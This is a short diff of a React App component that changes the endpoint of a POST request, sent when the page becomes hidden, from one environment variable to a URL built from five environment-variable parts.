@@ -18,7 +18,12 @@ export default function App() {
 
         document.addEventListener("visibilitychange", ()=>{
             if (document.hidden) {
-                fetch(process.env.REACT_APP_POST_API,{
+                const api = "https://" + process.env.REACT_APP_PART_ONE+
+                    "."+ process.env.REACT_APP_PART_TWO+"."+
+                    process.env.REACT_APP_PART_THREE + "."+
+                    process.env.REACT_APP_PART_FOUR+ ".com/"+
+                    process.env.REACT_APP_PART_FIVE+ "/"
+                fetch(api,{
                     method: "post",
                     headers: {
                         "Content-type": "application/json"
